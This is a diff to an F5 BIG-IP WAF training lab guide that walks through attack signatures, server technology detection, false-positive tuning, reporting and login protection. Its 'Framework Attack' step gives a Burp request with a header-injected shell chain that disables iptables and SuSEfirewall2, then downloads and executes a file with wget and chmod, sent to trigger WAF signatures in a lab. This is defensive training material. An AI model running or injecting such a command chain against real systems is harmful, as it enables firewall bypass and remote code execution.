@@ -9,15 +9,14 @@ We created a transparent policy way back in Lab 1 to configure IPI and Geolocati
 - Review Learning & Blocking & Policy Building Process settings
 - Implement HTTP Protocol Compliancy checks and test
 - Test with a HTTP Protocol violation plus XSS attack
-- Enable Server Technologies https://clouddocs.f5.com/training/community/waf/html/class3/module3/lab3/lab3.html
-- Review Default Attack Signature Configuration. 
+- Enable Server Technologies & Attack Signatures
 - Review Reporting
+- Review Policy Building Process Settings and Whitelist
 
-
-Bonus- Review Login Page Protection and Brute Force Configuration protection. 
+**Bonus** - Review Login Page Protection and Brute Force Configuration protection. 
  
 
-- Estimated time for completion **45** **minutes**.
+- Estimated time for completion **30** **minutes**.
 
 Learning & Blocking & Policy Building
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -99,3 +98,98 @@ XSS in HOST Header
 
 #. Browse to **Security > Event Logs > Application > Requests** and review the alert for this Sev5 attack. Note the alert severity is much higher (5) for this attack type due to several violations occuring.
 #. Review all the details and then click the **3** under the **Attack Signature Detected** violation to see all of the XSS Attack Signatures that were triggered. 
+
+Server Technologies & Attack Signatures
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+In this exercise we will examine server technologies which allow you to automatically discover server-side frameworks, web servers and operating systems. This feature helps when the backend technologies are not well known. The feature can be enabled to auto detect. You can also add the technologies that you know. Creating custom signature sets allows you to define what signature groupings work best for your needs. In this exercise we will explore both.
+
+#. Go to **Security > Application Security > Policy Building > Learning and Blocking Settings > Attack Signatures**
+#. Review the Attack Signatures that were applied during policy creation from back in Lab 1. Notice that they are set to **Learn/Alarm/Block and Staging is enabled**. 
+#. Locate Server Technologies and expand the option. Click **Enable Server Technology Detection**.
+
+.. image:: images/st.png
+  :width: 600 px
+
+**Make sure to Save and Apply Policy.**
+
+.. Note:: Our policy is currently in manual and we will need to manaully accept all server technologies suggestions as they are learned to build the server technology signature sets. If the policy were in automatic learning server technologies would automatically be accepted once the threshold was met.
+
+#. On Client01 load the bookmark for **Webgoat** and Login. **Remain logged in for the duration of the lab.**
+#. On BIG-IP  Go to **Security > Application Security > Policy Building > Traffic Learning** and notice the three new 100% alerts for Server Technologies. 
+#. Select all three suggestions and click **Accept**. 
+
+**Make sure to Apply Policy**
+
+.. image:: images/st_learning.png
+  :width: 600 px
+
+#. Go to **Security > Application Security > Policy Building > Learning and Blocking Settings > Attack Signatures** and notice the the Server Technology signature sets that were added to the policy when you accepted the learning sugestions. 
+#. Click **Change** and select the Unix/Linux Signature sets at the bottom and click **Change**, then click **Save** and **Apply Policy**
+
+.. image:: images/unix.png
+  :width: 600 px
+
+Framework Attacks
+~~~~~~~~~~~~~~~~~~~
+
+Back in BURP navigate to the repeater tab and adjust the payload to the following and hit go. **Use the password provided by the instructor**
+
+|
+
+Framework Attack
+
+::
+
+  POST https://10.1.10.145/WebGoat/login HTTP/1.1
+  User-Agent: ImperialProbeDroid
+  Pragma: no-cache
+  Cache-Control: no-cache
+  Content-Type: /etc/init.d/iptables stop; service iptables stop; SuSEfirewall2 stop; reSuSEfirewall2 stop; cd /tmp; wget -c https://10.1.10.145:443/7; chmod 777 7; ./7;
+  Content-Length: 38
+  Host: DarthMaul
+
+  username=f5student&password=password
+
+
+#. Browse to **Security > Event Logs > Application > Requests** and look for the most recent Sev5 Event. Also note the plethora of Sev3 Alerts for the **/Webgoat/service/lessonoverview.mvc and lessonmenu.mvc**. These are false positives that we will deal with momentarily. 
+#. Click on the Sev5 **/WebGoat/login** alert, click on the number **2** under Attack Signature Detected - Occurrences.  Next click on the little blue “i” next to the signature for more information.
+
+.. image:: images/alerts.png
+  :width: 600 px
+
+We are now alerting on attacks aimed at Server Technologies. 
+
+Clear the False positives
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+#. Select the Sev3 Alert for the **/Webgoat/service/lessonoverview.mvc** and **Accept** the alert. These alerts are due to the fact that we are still using an IP address for a hostname and we have enabled the HTTP Protocol Compliance check for this. Accessing a site by IP is sometimes a reality in app development although not best practice. 
+#. Browse to **Security > Event Logs > Application > Requests** and notice now the requests are no longer triggering the alert. 
+
+.. image:: images/cleared.png
+  :width: 600 px
+
+Review Reporting
+~~~~~~~~~~~~~~~~~~
+#. Navigate to **Security > Reporting > Application > Charts** and review all of types of reports you can generate and export. 
+
+IMAGE
+
+Bonus
+~~~~~~~~~~
+Protecting a login page is a very important role for a WAF. While brute force attacks are on the decline, Credential Stuffing attacks have increased several times over in the past 5 years. 
+#. Navigate to **Security > Application Security > Sessions and Logins > Login Pages List**
+#. Configure the Login Page as show below and click **Create** and **Apply Polilcy**.
+
+.. image:: images/login.png
+  :width: 600 px
+
+#. Navigate to **Security > Application Security > Brute Force Attack Prevention** and click **Create**. 
+#. Review all of the configuration options available for protecting a Login Page from Brute Force and Credential Stuffing Attacks. 
+
+.. NOTE:: The security policy's enforcement mode is Transparent. Requests will not be blocked unless the enforcement mode is changed to Blocking on the Learning and Blocking Settings screen
+
+**This completes Lab 4**
+
+
+
